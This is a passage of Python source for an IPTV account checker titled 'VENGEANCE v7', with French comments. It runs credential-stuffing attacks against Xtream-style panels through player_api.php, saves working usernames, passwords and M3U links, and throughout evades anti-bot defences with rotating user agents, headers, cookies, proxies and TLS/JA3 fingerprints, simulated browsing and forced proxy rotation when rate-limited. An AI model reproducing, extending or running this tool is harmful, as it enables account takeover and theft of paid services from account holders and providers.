            s.ja3_signature = getattr(adapter, 'ja3_signature', None)
        except Exception:
            s.ja3_signature = None
        s.last_tls_regen = time.time()
        s.tls_regen_threshold = getattr(s, 'tls_regen_threshold', 12)

        # 🔒 ENREGISTREMENT POUR FERMETURE PROPRE
        _thread_local.s = s
        _register_session(s)

        # 🎯 HOOK DE SURVEILLANCE AVEC GESTION PROXY (conserve la logique d’échec)
        def _proxy_aware_response_hook(response, *args, **kwargs):
            """Hook pour analyser les réponses et ajuster le comportement proxy"""
            s = getattr(_thread_local, "s", None)
            if s and hasattr(s, 'metrics'):
                s.metrics['total_requests'] += 1
                
                # Gestion des échecs de proxy
                if not response.ok:
                    s.metrics['failed_requests'] += 1
                    if getattr(s, 'proxies', None):
                        s.metrics['proxy_failures'] += 1
                        # (rotation déjà per-request; ce compteur reste utile pour diagnostic)
                else:
                    if 'proxy_failures' in s.metrics:
                        s.metrics['proxy_failures'] = 0
                
                # Ajustement dynamique basé sur le taux d'échec (UA/headers)
                failure_rate = s.metrics['failed_requests'] / max(1, s.metrics['total_requests'])
                if failure_rate > 0.3:
                    s.ua_rotate_every = max(10, s.ua_rotate_every - 5)
                    s.header_variation_every = max(8, s.header_variation_every - 2)

        s.hooks['response'] = [_proxy_aware_response_hook]

        # 🌐 1ère passe : ajuster éventuellement les headers HTTP/2 en fonction de la JA3
        try:
            _simulate_http2_behavior(s)
        except Exception:
            pass

    return s
    
def _enhanced_rotate_user_agent(s):
    """
    Rotation intelligente et cohérente avec support proxy :
     - change l'UA et aligne la signature TLS (regénération adapter) de manière contrôlée
     - met à jour le 'client storage' simulé (localStorage/IndexedDB headers)
     - active/supprime les headers HTTP/2 de façon cohérente avec la JA3
     - gère la rotation des proxies pour une furtivité maximale
     - conserve les rotations cookies / headers et le contrôle adaptatif existant
    """
    if s is None:
        return

    s.request_count += 1
    time_based_rotation = (time.time() - getattr(s, "last_rotation", 0)) > 30

    # ——— ROTATION DES PROXIES ———
    if (hasattr(s, 'proxies') and s.proxies and 
        hasattr(_thread_local, 'proxies') and _thread_local.proxies):
        
        proxy_rotation_needed = (
            (s.request_count % getattr(s, 'proxy_rotate_every', 50) == 0) or
            (time.time() - getattr(s, 'last_proxy_rotate', 0) > 120) or
            (getattr(s, 'metrics', {}).get('proxy_failures', 0) >= getattr(s, 'max_proxy_failures', 3))
        )
        
        if proxy_rotation_needed:
            if _rotate_proxy(s):
                s.metrics['proxy_failures'] = 0  # Reset après rotation réussie
                # Petit délai après rotation de proxy pour éviter la détection
                _interruptible_sleep(random.uniform(0.1, 0.5))

    # ——— Rotation principale (User-Agent + famille) ———
    if (s.request_count % getattr(s, "ua_rotate_every", 50) == 0) or time_based_rotation:
        try:
            old_ua = s.headers.get("User-Agent", "")
        except Exception:
            old_ua = ""

        new_ua = random.choice(USER_AGENTS)
        s.headers["User-Agent"] = new_ua
        s.ua = new_ua  # 🔹 synchronisation interne

        # mettre à jour le timestamp de rotation
        s.last_rotation = time.time()

        # Détection famille navigateur
        fam = (
            "edge" if ("Edg" in new_ua or "Edge" in new_ua) else
            "firefox" if "Firefox" in new_ua and "Mobile" not in new_ua else
            "safari" if ("Safari" in new_ua and "Chrome" not in new_ua) else
            "chrome"
        )
        s.browser_family = fam  # 🔹 synchronisation interne

        # Purge des anciens Sec-CH incohérents
        for k in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform"):
            s.headers.pop(k, None)

        # Réinjection des bons Sec-CH
        if fam in ("chrome", "edge"):
            chrome_ver = str(random.randint(120, 125))
            s.headers["Sec-Ch-Ua"] = (
                f'"Chromium";v="{chrome_ver}", "Google Chrome";v="{chrome_ver}", '
                f'"Not=A?Brand";v="{random.randint(8,99)}"'
            )
            s.headers["Sec-Ch-Ua-Mobile"] = "?1" if any(
                x in new_ua for x in ("Mobile", "Android", "iPhone")
            ) else "?0"
            s.headers["Sec-Ch-Ua-Platform"] = random.choice(
                ['"Android"', '"Windows"', '"Linux"', '"macOS"']
            )
        elif fam == "safari":
            s.headers.setdefault("Referer", "https://www.google.com/")
            # Safari ne doit pas typiquement posséder Sec-CH; on s'assure qu'ils sont absents
            for k in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform"):
                s.headers.pop(k, None)
        elif fam == "firefox":
            s.headers.setdefault("Referer", "https://www.bing.com/")
            for k in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform"):
                s.headers.pop(k, None)

        # ——— Aligner TLS/JA3 avec la nouvelle UA ———
        # Garde-fou : ne pas regénérer trop souvent si sessions très actives
        try:
            # regen_threshold en secondes (évite regen à chaque petite rotation)
            regen_threshold = getattr(s, "tls_regen_threshold", 12)
            last_tls_regen = getattr(s, "last_tls_regen", 0)
            # On regenère si : UA réellement changée ET dernière regen > seuil
            if new_ua != old_ua and (time.time() - last_tls_regen) > regen_threshold:
                try:
                    _regenerate_tls_for_session(s)
                    s.last_tls_regen = time.time()
                    # exposer la signature sur la session (si l'adapter l'a créée)
                    s.ja3_signature = getattr(s, "ja3_signature", getattr(s, "ja3_signature", ""))
                except Exception:
                    # fail-safe : ne pas planter la rotation si regen échoue
                    s.ja3_signature = getattr(s, "ja3_signature", None)
        except Exception:
            pass

        # ——— Mise à jour du 'localStorage' simulé pour cohérence entre requêtes ———
        try:
            _update_client_storage_on_rotation(s)
        except Exception:
            try:
                _init_client_storage(s)
            except Exception:
                pass

        # ——— HTTP/2 simulation cohérente selon la JA3 ———
        try:
            _simulate_http2_behavior(s)
        except Exception:
            pass

    # ——— Rotation cookies ———
    try:
        if s.request_count % getattr(s, "cookie_rotate_every", 30) == 0:
            try:
                s.cookies.clear()
                s.cookies.update(_get_cookies_for_request())
                # après mise à jour des cookies, rafraîchir aussi le stockage simulé
                try:
                    _update_client_storage_on_rotation(s)
                except Exception:
                    pass
            except Exception:
                pass
    except Exception:
        pass

    # ——— Variation légère headers ———
    try:
        if s.request_count % getattr(s, "header_variation_every", 20) == 0:
            _vary_headers(s)
    except Exception:
        pass

    # ——— Gestion adaptative des proxies basée sur les performances ———
    if (hasattr(s, 'proxies') and s.proxies and 
        hasattr(s, 'metrics') and s.metrics.get('total_requests', 0) > 20):
        
        total_requests = s.metrics['total_requests']
        failed_requests = s.metrics['failed_requests']
        failure_rate = failed_requests / total_requests
        
        # Ajustement dynamique de la rotation proxy basé sur le taux d'échec
        if failure_rate > 0.4:
            # Augmenter la fréquence de rotation des proxies en cas de taux d'échec élevé
            s.proxy_rotate_every = max(15, int(getattr(s, 'proxy_rotate_every', 50) * 0.7))
            s.ua_rotate_every = max(10, int(getattr(s, 'ua_rotate_every', 50) * 0.8))
        elif failure_rate < 0.1:
            # Réduire la rotation si tout va bien (économie de ressources)
            s.proxy_rotate_every = min(100, int(getattr(s, 'proxy_rotate_every', 50) * 1.3))
            s.ua_rotate_every = min(80, int(getattr(s, 'ua_rotate_every', 50) * 1.2))

    # ——— Contrôle adaptatif global ———
    try:
        _adaptive_rotation_control(s)
    except Exception:
        pass
    
    
# =================== NETWORK ===================

def fetch_json(url, timeout=10):
    """
    Version furtive avancée : rotation intelligente, comportement humain, anti-détection, support proxy.
    Corrigée pour arrêt instantané (F/S) grâce à _interruptible_sleep().
    """
    try:
        # Vérification d'arrêt prioritaire
        if _STOP_ALL.is_set():
            return None

        s = _thread_session()
        _enhanced_rotate_user_agent(s)

        # ✅ DÉTECTION SI ON UTILISE UN PROXY
        using_proxy = bool(s.proxies)
        
        # ✅ TIMEOUTS ADAPTATIFS
        connect_timeout, read_timeout = _get_adaptive_timeouts(using_proxy)

        # Cookies frais pour chaque requête
        cookies = _get_cookies_for_request()
        
        # Headers avancés et variables
        extra_headers = {}
        
        # Rotation intelligente des headers
        header_roll = random.random()
        if header_roll > 0.6:
            extra_headers['X-Requested-With'] = 'XMLHttpRequest'
        if header_roll > 0.7:
            referer_base = url.rsplit('/', 1)[0] if '/' in url else url
            extra_headers['Referer'] = referer_base + '/'

        # Déterminer si l'UA de session est "chromish" (Chrome/Edge)
        session_ua = s.headers.get("User-Agent", "") if s else ""
        is_chromish = any(k in session_ua for k in ("Chrome", "Edg", "Edge"))

        # N'ajouter Sec-Ch-Ua* que si UA Chrome/Edge
        if is_chromish and header_roll > 0.5:
            extra_headers['Sec-Ch-Ua'] = f'"Chromium";v="{random.randint(120, 124)}", "Not=A?Brand";v="{random.randint(8, 99)}"'
            extra_headers['Sec-Ch-Ua-Mobile'] = '?1' if any(x in session_ua for x in ("Mobile","Android","iPhone")) else '?0'
            extra_headers['Sec-Ch-Ua-Platform'] = random.choice(['"Android"', '"Linux"', '"Windows"', '"macOS"'])

        # Accept / Langue
        extra_headers['Accept'] = random.choice([
            'application/json,text/plain,*/*',
            'application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        ])
        lang_choices = [
            'fr-FR,fr;q=0.9,en;q=0.8,pt;q=0.7',
            'en-US,en;q=0.9,fr;q=0.8,pt;q=0.7',
            'pt-BR,pt;q=0.9,en;q=0.8,fr;q=0.7',
            'es-ES,es;q=0.9,en;q=0.8,fr;q=0.7'
        ]
        extra_headers['Accept-Language'] = (
            s.headers.get("Accept-Language") if s and s.headers.get("Accept-Language")
            else random.choice(lang_choices)
        )
        extra_headers['Cache-Control'] = random.choice(['no-cache', 'max-age=0', 'no-store'])

        # Délai humain avant la requête
        human_delay = random.uniform(0.1, 0.8)
        t_end = time.time() + human_delay
        while time.time() < t_end:
            if _STOP_ALL.is_set():
                return None
            _interruptible_sleep(0.02)

        # 🔄 Gestion spéciale pour les requêtes avec proxy
        proxy_info = ""
        if hasattr(s, 'proxies') and s.proxies:
            proxy_info = f" via proxy {s.proxies.get('http', 'N/A')}"

        try:
            # Requête HTTP principale avec support proxy intégré
            r = s.get(
                url, 
                timeout=(connect_timeout, read_timeout),  # ← TIMEOUTS ADAPTATIFS ICI
                cookies=cookies, 
                headers=extra_headers,
                allow_redirects=True,
                verify=(random.random() > 0.2)
                # 🔄 Les proxies sont automatiquement gérés par la session via s.proxies
            )

            if _STOP_ALL.is_set():
                return None

            # 🔄 Gestion des échecs de proxy
            if hasattr(s, 'proxies') and s.proxies:
                # Réinitialiser le compteur d'échecs proxy en cas de succès
                if hasattr(s, 'metrics') and 'proxy_failures' in s.metrics:
                    s.metrics['proxy_failures'] = 0

            # Gestion des statuts HTTP
            code = r.status_code

            if code == 200:
                content_type = r.headers.get('Content-Type', '').lower()
                if 'application/json' in content_type or 'text/plain' in content_type:
                    try:
                        return r.json()
                    except ValueError:
                        return None
                return None

            # === Gestions spécifiques avec gestion proxy ===
            elif code == 429:  # Too Many Requests
                # 🔄 Rotation forcée du proxy en cas de rate limiting
                if hasattr(s, 'proxies') and s.proxies:
                    _rotate_proxy(s)
                
                t_end = time.time() + random.uniform(2.0, 5.0)
                while time.time() < t_end:
                    if _STOP_ALL.is_set():
                        return None
                    _interruptible_sleep(0.1)
                return None

            elif code == 503:  # Service Unavailable
                t_end = time.time() + random.uniform(3.0, 8.0)
                while time.time() < t_end:
                    if _STOP_ALL.is_set():
                        return None
                    _interruptible_sleep(0.1)
                return None

            elif code in (403, 401, 407):  # 407 = Proxy Authentication Required
                # 🔄 Rotation du proxy en cas d'erreur d'authentification proxy
                if code == 407 and hasattr(s, 'proxies') and s.proxies:
                    _rotate_proxy(s)
                    # Réessayer une fois avec le nouveau proxy
                    try:
                        _interruptible_sleep(random.uniform(1.0, 2.0))
                        if not _STOP_ALL.is_set():
                            r_retry = s.get(
                                url, 
                                timeout=(connect_timeout, read_timeout),  # ← MÊME TIMEOUT ADAPTATIF
                                cookies=cookies, 
                                headers=extra_headers,
                                allow_redirects=True,
                                verify=(random.random() > 0.2)
                            )
                            if r_retry.status_code == 200:
                                content_type = r_retry.headers.get('Content-Type', '').lower()
                                if 'application/json' in content_type or 'text/plain' in content_type:
                                    try:
                                        return r_retry.json()
                                    except ValueError:
                                        pass
                    except Exception:
                        pass
                
                t_end = time.time() + random.uniform(1.0, 3.0)
                while time.time() < t_end:
                    if _STOP_ALL.is_set():
                        return None
                    _interruptible_sleep(0.05)
                return None

            else:
                _interruptible_sleep(random.uniform(0.5, 1.5))
                return None

        # === Exceptions réseau avec gestion proxy ===
        except requests.exceptions.Timeout:
            # 🔄 Incrémenter les échecs proxy
            if hasattr(s, 'proxies') and s.proxies and hasattr(s, 'metrics'):
                s.metrics['proxy_failures'] = s.metrics.get('proxy_failures', 0) + 1
            
            t_end = time.time() + random.uniform(1.0, 3.0)
            while time.time() < t_end:
                if _STOP_ALL.is_set():
                    return None
                _interruptible_sleep(0.05)
            return None

        except requests.exceptions.ConnectionError:
            # 🔄 Incrémenter les échecs proxy et rotation si nécessaire
            if hasattr(s, 'proxies') and s.proxies and hasattr(s, 'metrics'):
                s.metrics['proxy_failures'] = s.metrics.get('proxy_failures', 0) + 1
                if s.metrics['proxy_failures'] >= getattr(s, 'max_proxy_failures', 3):
                    _rotate_proxy(s)
            
            t_end = time.time() + random.uniform(2.0, 4.0)
            while time.time() < t_end:
                if _STOP_ALL.is_set():
                    return None
                _interruptible_sleep(0.05)
            return None

        except requests.exceptions.SSLError:
            _interruptible_sleep(random.uniform(0.5, 1.5))
            return None

        except requests.exceptions.ProxyError:
            # 🔄 Erreur spécifique au proxy - rotation immédiate
            if hasattr(s, 'proxies') and s.proxies:
                _rotate_proxy(s)
                # Réessayer une fois avec le nouveau proxy
                try:
                    _interruptible_sleep(random.uniform(1.0, 2.0))
                    if not _STOP_ALL.is_set():
                        r_retry = s.get(
                            url, 
                            timeout=(connect_timeout, read_timeout),  # ← MÊME TIMEOUT ADAPTATIF
                            cookies=cookies, 
                            headers=extra_headers,
                            allow_redirects=True,
                            verify=(random.random() > 0.2)
                        )
                        if r_retry.status_code == 200:
                            content_type = r_retry.headers.get('Content-Type', '').lower()
                            if 'application/json' in content_type or 'text/plain' in content_type:
                                try:
                                    return r_retry.json()
                                except ValueError:
                                    pass
                except Exception:
                    pass
            return None

    except Exception as e:
        # Log silencieux des erreurs inattendues avec info proxy
        try:
            proxy_status = "with proxy" if hasattr(s, 'proxies') and s.proxies else "without proxy"
            # Debug optionnel : décommentez la ligne suivante pour voir les erreurs
            # print(f"⚠️ Silent error {proxy_status}: {str(e)[:100]}...")
        except:
            pass
        return None

def check_server_status(server_url, timeout=5):
    """
    Test robuste pour panels IPTV :
    - HEAD d'abord (rapide)
    - fallback GET léger (Range: 0-0) si HEAD échoue ou renvoie 405/400
    Retourne: {'status': ..., 'code': int|None, 'latency': ms|None}
    """
    result = {'status': 'offline', 'code': None, 'latency': None}
    try:
        s = requests.Session()
        s.headers['User-Agent'] = random.choice(USER_AGENTS)
        url = f"http://{server_url}" if not server_url.startswith("http") else server_url

        def _classify(code):
            if code is None:
                return 'offline'
            if 200 <= code < 300:
                return 'online'
            if code in (401, 403):
                return 'protected'
            if 300 <= code < 400:
                return 'redirect'
            if 400 <= code < 500:
                return 'client_error'
            if 500 <= code < 600:
                return 'server_error'
            return 'unknown'

        # 1) HEAD
        t0 = time.time()
        try:
            r = s.head(url, timeout=(timeout, timeout), allow_redirects=True)
            result['latency'] = int((time.time() - t0) * 1000)
            result['code'] = r.status_code
            # Si HEAD est refusé ou douteux, on tente GET léger
            if r.status_code in (400, 405) or r.status_code is None:
                raise RuntimeError("HEAD not reliable, try GET")
        except Exception:
            # 2) GET léger (ne télécharge pas la page entière)
            t0 = time.time()
            r = s.get(
                url,
                timeout=(timeout, timeout),
                allow_redirects=True,
                headers={'Range': 'bytes=0-0', 'Accept': '*/*'}
            )
            # on considère la réponse comme valide même si 401/403/etc.
            result['latency'] = int((time.time() - t0) * 1000)
            result['code'] = r.status_code

        result['status'] = _classify(result['code'])
    except Exception:
        result['status'] = 'offline'
    return result

def background_status_refresher(server_url, interval=15):
    """Rafraîchit le statut serveur pendant le scan."""
    while True:
        try:
            status = check_server_status(server_url)
            code = status.get("code", "—")
            latency = status.get("latency", "—")

            # Couleur principale selon le statut
            if status["status"] == "online":
                color = "\x1b[1;32m"  # vert
            elif status["status"] == "protected":
                color = "\x1b[1;33m"  # jaune
            elif status["status"] in ("redirect", "client_error"):
                color = "\x1b[1;34m"  # bleu
            elif status["status"] == "server_error":
                color = "\x1b[1;31m"  # rouge
            else:
                color = "\x1b[90m"    # gris

            # Couleur du temps de réponse (latence) — version souple
            if latency == "—" or latency is None:
                latency_color = "\x1b[90m—\x1b[0m"
            elif latency < 400:
                latency_color = f"\x1b[1;32m{latency} ms\x1b[0m"   # 🟢 rapide (<400)
            elif latency < 600:
                latency_color = f"\x1b[1;33m{latency} ms\x1b[0m"   # 🟡 moyen (400–599)
            else:
                latency_color = f"\x1b[1;31m{latency} ms\x1b[0m"   # 🔴 lent (≥600)

            # Couleur du code HTTP (même couleur que le statut)
            if code != "—" and isinstance(code, int):
                code_colored = f"{color}{code}\x1b[0m"
            else:
                code_colored = "\x1b[90m—\x1b[0m"

            # 🔹 Parenthèses en gris clair
            gray = "\x1b[90m"
            reset = "\x1b[0m"

            # Ligne finale : statut + code + latence, avec parenthèses grises
            status_text = (
                f"{color}{status['status'].upper()}{reset} "
                f"{gray}({reset}{code_colored}{gray}, {reset}{latency_color}{gray}){reset}"
            )

            globals().setdefault("_SERVER_STATUS", {})["text"] = status_text
            globals().setdefault("_SERVER_STATUS", {})["ts"] = int(time.time())

        except Exception:
            globals().setdefault("_SERVER_STATUS", {})["text"] = "\x1b[1;31mOFFLINE\x1b[0m (\x1b[90m—, —\x1b[0m)"

        time.sleep(interval)
           
def _fetch_json_if_empty(url: str, pause: float = 0.7):
    """
    Appelle fetch_json(url) une fois.
    Si le résultat est vide ([], None, {}), attend 'pause' sec et retente 1 fois.
    Retourne la première réponse non-vide, sinon la dernière (potentiellement vide).
    """
    try:
        data = fetch_json(url)
        ok = bool(data) and (isinstance(data, (list, dict)) and len(data) > 0)
        if ok:
            return data or []
        time.sleep(max(0.0, float(pause)))
        data2 = fetch_json(url)
        return data2 or []
    except Exception:
        try:
            time.sleep(max(0.0, float(pause)))
        except Exception:
            pass
        try:
            data2 = fetch_json(url)
            return data2 or []
        except Exception:
            return []
            
def fetch_counts(server, user, pwd):
    base = f'http://{server}/player_api.php?username={user}&password={pwd}'
    
    # Délai aléatoire entre les appels
    time.sleep(random.uniform(0.2, 0.8))
    
    canais = fetch_json(base + '&action=get_live_streams') or []
    filmes = fetch_json(base + '&action=get_vod_streams') or []
    series = fetch_json(base + '&action=get_series') or []
    return (len(canais), len(filmes), len(series))

def fetch_tv_categories_block(server, user, pwd):
    """
    Catégories IPTV live (>=1 chaîne), avec retry intelligent:
    - 1ère tentative pour cats & streams
    - on ne refait une 2e tentative que si la première était vide
    - si l'un est vide mais l'autre existe, on ne retente que celui qui manque
    - si malgré tout rien n'apparaît, on affiche '• —'
    """
    base = f'http://{server}/player_api.php?username={user}&password={pwd}'

    url_streams = base + '&action=get_live_streams'
    url_cats    = base + '&action=get_live_categories'

    # 1) Première passe
    cats    = fetch_json(url_cats)    or []
    streams = fetch_json(url_streams) or []

    # 2) Retry intelligent: on ne retente QUE si vide
    if not cats:
        cats = _fetch_json_if_empty(url_cats, pause=0.7)
    if not streams:
        streams = _fetch_json_if_empty(url_streams, pause=0.7)

    # 3) Si on a des catégories mais 0 chaînes comptées (souvent timeout côté streams),
    #    on retente SPECIFIQUEMENT streams 1 fois de plus.
    counts = {}
    if isinstance(streams, list):
        for ch in streams:
            try:
                cid = str((ch or {}).get('category_id', '')).strip()
                if cid:
                    counts[cid] = counts.get(cid, 0) + 1
            except Exception:
                continue

    if cats and not counts:
        # re-tenter streams seulement s'il n'y a toujours aucun comptage
        more_streams = fetch_json(url_streams) or []
        if more_streams:
            for ch in more_streams:
                try:
                    cid = str((ch or {}).get('category_id', '')).strip()
                    if cid:
                        counts[cid] = counts.get(cid, 0) + 1
                except Exception:
                    continue
        if not counts:
            # dernier essai ciblé, avec petite pause
            try:
                time.sleep(0.5)
            except Exception:
                pass
            more_streams = fetch_json(url_streams) or []
            if more_streams:
                for ch in more_streams:
                    try:
                        cid = str((ch or {}).get('category_id', '')).strip()
                        if cid:
                            counts[cid] = counts.get(cid, 0) + 1
                    except Exception:
                        continue

    # 4) Construction du bloc final
    lines = []
    lines.append("📺 CATEGORIES")
    lines.append("━━━━━━━━━━━━━━━")

    seen = set()
    if isinstance(cats, list):
        for c in cats:
            try:
                if not c:
                    continue
                cid  = str(c.get('category_id', '')).strip()
                name = (c.get('category_name') or '').strip()
                if not cid or not name or cid in seen:
                    continue
                if counts.get(cid, 0) <= 0:
                    continue  # ignorer catégories sans chaînes live
                lines.append(f"• {name}")
                seen.add(cid)
            except Exception:
                continue

    if len(lines) == 2:
        lines.append("• —")

    return "\n".join(lines)

def check_target(server, item, max_retries=0):
    """Version améliorée avec fingerprinting avancé et simulation de navigation"""
    user, pwd = item

    # Vérification IMMÉDIATE et FRÉQUENTE de l'arrêt
    if _STOP_ALL.is_set():
        return (False, {})

    # 🔧 Étape 1: Simulation de navigation avant la requête principale (30% du temps)
    if random.random() > 0.7:
        _simulate_browser_navigation(server, user, pwd)

    # Tentative principale avec retry intelligent
    for attempt in range(max_retries + 1):
        # Vérification avant chaque tentative
        if _STOP_ALL.is_set():
            return (False, {})

        # 🔧 Étape 2: Fingerprinting avancé pour cette tentative
        session = _thread_session()
        _add_browser_fingerprint_headers(session)
        _simulate_http2_behavior(session)

        url = f'http://{server}/player_api.php?username={user}&password={pwd}'

        # Vérification après préparation
        if _STOP_ALL.is_set():
            return (False, {})

        # 🔧 Étape 3: Comportement utilisateur simulé (20% du temps)
        if random.random() > 0.8:
            _simulate_user_interaction(server)

        # ✅ fetch_json gère déjà la rotation UA + cookies + fingerprinting TLS
        data = fetch_json(url)

        # Vérification après requête
        if _STOP_ALL.is_set():
            return (False, {})

        if isinstance(data, dict):
            status = str(data.get('user_info', {}).get('status', '')).lower()
            if status in ('active', '1', 'true', 'ok'):
                # 🔧 Simulation post-validation (10% du temps)
                if random.random() > 0.9:
                    _simulate_browser_navigation(server, user, pwd)
                return (True, data)
            else:
                return (False, data)
        else:
            # Backoff exponentiel avec vérification CONTINUE
            if attempt < max_retries:
                base_delay = min(30.0, (2 ** attempt) + random.uniform(0.5, 2.0))
                end_t = time.time() + base_delay
                # Dormir par petits pas avec vérification fréquente
                while time.time() < end_t:
                    if _STOP_ALL.is_set():
                        return (False, {})
                    time.sleep(0.01)  # Vérification toutes les 10 ms

    return (False, {})
    
def fetch_details(server, item, data, combo_name):
    user, pwd = item
    ui = data.get('user_info', {})
    created = _format_ts(ui.get('created_at', ''))
    exp = _format_ts(ui.get('exp_date', ''))
    days_left = _days_left(ui.get('exp_date', ''))
    max_conn = ui.get('max_connections', '1')
    act_conn = ui.get('active_cons', '0')
    host = server.split(':')[0]
    port = server.split(':')[1] if ':' in server else '80'
    m3u = f'http://{server}/get.php?username={user}&password={pwd}&type=m3u_plus'
    total_channels, total_movies, total_series = fetch_counts(server, user, pwd)

    # ⬇️ Bloc catégories formaté (• Nom) à afficher sous le cadre
    categories_block = fetch_tv_categories_block(server, user, pwd)

    now = datetime.datetime.now().strftime('%d/%m/%Y')
    return (
        "\nVΞNGΞANCΞ v7\n"
        "├●🌐Server ➤ http://{srv}\n├●🛰️Real Host ➤ {host}\n├●📡Port ➤ {port}\n"
        "├●🔍Status ➤ {status}\n├●👤User ➤ {user}\n├●🔐Password ➤ {pwd}\n"
        "├●📅Scan Date ➤ {now}\n├●📅Created at ➤ {created}\n├●📆Expires at ➤ {exp}\n"
        "├●🗓️Days left ➤ {days}\n"
        "├●📺{channels} channels | 🍿 {movies} movies | 🎥 {series} series\n"
        "├●👥Connections ➤ {act_conn}/{max_conn}\n"
        "├●🧩M3U Link ➤ {m3u}\n"
        "{categories}\n"              # <= bloc catégories directement après la M3U
        "╰─────────────────────\n"    # <= fermeture tout en bas
    ).format(
        srv=server, host=host, port=port, status=ui.get('status', ''),
        user=user, pwd=pwd, now=now, created=created, exp=exp, days=days_left,
        channels=total_channels, movies=total_movies, series=total_series,
        act_conn=act_conn, max_conn=max_conn, combo=combo_name, m3u=m3u,
        categories=categories_block
    )
        
def save_full(server_key, text):
    path = os.path.join(OUT_DIR, 'FULL@{0}.txt'.format(server_key))
    with open(path, 'a', encoding='utf-8') as f:
        f.write(text.strip() + '\n\n') 
# ===== Largeur d'affichage robuste (wcwidth si dispo) =====
try:
    import wcwidth as _wc
    def _vislen(s: str) -> int:
        n = _wc.wcswidth(s)
        return n if n >= 0 else len(s)
    def _charw(ch: str) -> int:
        n = _wc.wcwidth(ch)
        return n if n >= 0 else 1
except Exception:
    import unicodedata as _ud
    _EMO_W = {"✨": 2, "👑": 2, "📜": 2, "⚡": 1, "🌐": 2, "⏳": 2, "🕒": 2}
    def _charw(ch: str) -> int:
        if ch in _EMO_W:
            return _EMO_W[ch]
        cat = _ud.category(ch)
        if cat in ("Mn", "Me", "Cf"):
            return 0
        eaw = _ud.east_asian_width(ch)
        return 2 if eaw in ("W", "F") else 1
    def _vislen(s: str) -> int:
        return sum(_charw(c) for c in s)

def _clip_to_width(s: str, max_cols: int) -> str:
    cols = 0; out = []
    for ch in s:
        w = _charw(ch)
        if cols + w > max_cols: break
        out.append(ch); cols += w
    if cols < _vislen(s) and max_cols > 0:
        while out and _charw(out[-1]) == 0: out.pop()
        if out: out.pop()
        out.append("…")
    return "".join(out)

def _pad_to_width(s: str, width: int) -> str:
    s = _clip_to_width(s, width)
    pad = width - _vislen(s)
    if pad > 0: s += " " * pad
    return s

def _truncate(s: str, maxlen: int) -> str:
    try:
        return s if len(s) <= maxlen else s[:max(0, maxlen-1)] + "…"
    except Exception:
        return s
# -- Helpers ANSI-aware pour TITRE (préservent les couleurs du spinner)
def _vislen_ansi(s: str) -> int:
    """Longueur visuelle en ignorant les codes ANSI."""
    return _vislen(_ansi_re.sub("", s))  # réutilise _vislen déjà défini

def _pad_title_ansi(s: str, width: int) -> str:
    """
    Coupe/pad le titre à 'width' colonnes, en ignorant les séquences ANSI.
    Conserve les couleurs et évite la troncature prématurée (…).
    """
    out = []
    cols = 0
    i = 0
    n = len(s)
    while i < n:
        m = _ansi_re.match(s, i)
        if m:
            out.append(m.group(0))
            i = m.end()
            continue
        ch = s[i]
        w = _charw(ch)  # déjà défini plus haut
        if cols + w > width:
            out.append("…")
            cols += 1
            break
        out.append(ch)
        cols += w
        i += 1
    pad = width - cols
    if pad > 0:
        out.append(" " * pad)
    return "".join(out)
# ===== Cadre compact (sans bordure droite) =====
def _box_compact(title: str, lines: list,
                 width: int = None,
                 title_color="\x1b[90m", body_color="\x1b[90m") -> list:
    """Cadre adaptatif (non compact), largeur dynamique selon terminal.
    - Coupe les lignes vides finales pour que la bordure du bas reste
      immédiatement sous le dernier contenu (ex: Combo).
    - Padding ANSI/emoji-aware pour éviter les décalages visuels.
    """
    import shutil

    # Largeur dynamique
    term_w = shutil.get_terminal_size((80, 20)).columns
    w = int((width or term_w) * 0.9)
    w = max(43, min(w, term_w - 2))  # garde-fous

    reset = "\x1b[0m"
    top = f"{title_color}╭" + "─" * (w - 2) + f"╮{reset}"
    bot = f"{title_color}╰" + "─" * (w - 2) + f"╯{reset}"
    inner = w - 3  # ‘│ ’ = 2 col à gauche + 1 col perdu à droite

    # Titre ANSI-aware
    hdr = f"{title_color}│ {body_color}{_pad_title_ansi(title, inner)}{reset}"

    # --- Nettoyage: supprimer UNIQUEMENT les lignes vides de fin
    clean = list(lines)
    while clean and _strip_ansi(clean[-1]).strip() == "":
        clean.pop()

    # Corps ANSI/emoji-aware (padding sur largeur visuelle)
    body = []
    for ln in clean:
        raw = ln.rstrip("\n")
        vis = _vislen(_strip_ansi(raw))  # largeur visuelle (emoji, CJK…)
        pad = " " * max(0, inner - vis)
        body.append(f"{title_color}│ {body_color}{raw}{pad}{reset}")

    return [top, hdr, *body, bot]

def _top_title_lines():
    import shutil
    term_w = shutil.get_terminal_size((80, 20)).columns
    RED   = "\x1b[1;31m"
    RESET = "\x1b[0m"
    GRAY  = "\x1b[90m"

    title     = "V E N G E A N C E"
    underline = "─" * len(title)

    pad = max(0, (term_w - len(title)) // 2)
    title_line = " " * pad + f"{RED}{title}{RESET}"
    underline_line = " " * pad + f"{RED}{underline}{RESET}"

    sig = f"{GRAY}ᴮʸ ᴵᴳᴼᴿ{RESET}"
    underline_line = underline_line + "  " + sig

    # ↓ ajoute une ligne vide au-dessus, supprime la ligne vide sous le titre
    return [
        "",              # pousse le titre un peu plus bas
        title_line,
        underline_line
    ]
# ===== Dashboard =====
def render_dashboard():
    """GLOBAL + Parts 1/2/3 — atomic render in a single write (anti-flicker)."""
    import shutil
    from collections import Counter
    global _LAST_FRAME_LINES

    elapsed = int(time.time() - _start)
    tempo_str = time.strftime('%H:%M:%S', time.gmtime(elapsed))

    # Snapshots (short locks)
    snaps = []
    for i in range(3):
        P = _PARTS[i]
        if P:
            with P["lock"]:
                snaps.append({
                    "name": P["name"],
                    "combo": P["combo"],
                    "checks": int(P["stats"].get("checks", 0)),
                    "total": int(P["total"]),
                    "hits": int(P["stats"].get("hits", 0)),
                    "saved": int(P["stats"].get("saved", 0)),
                    "cpm": float(P["stats"].get("cpm", 0.0)),
                    "current": P.get("current_server", "—"),
                })
        else:
            snaps.append(None)

    # Aggregates
    total_checks_done = sum(s["checks"] for s in snaps if s) if any(snaps) else 0
    total_checks_all  = sum(s["total"]  for s in snaps if s) if any(snaps) else 0
    total_hits_all    = sum(s["hits"]   for s in snaps if s) if any(snaps) else 0
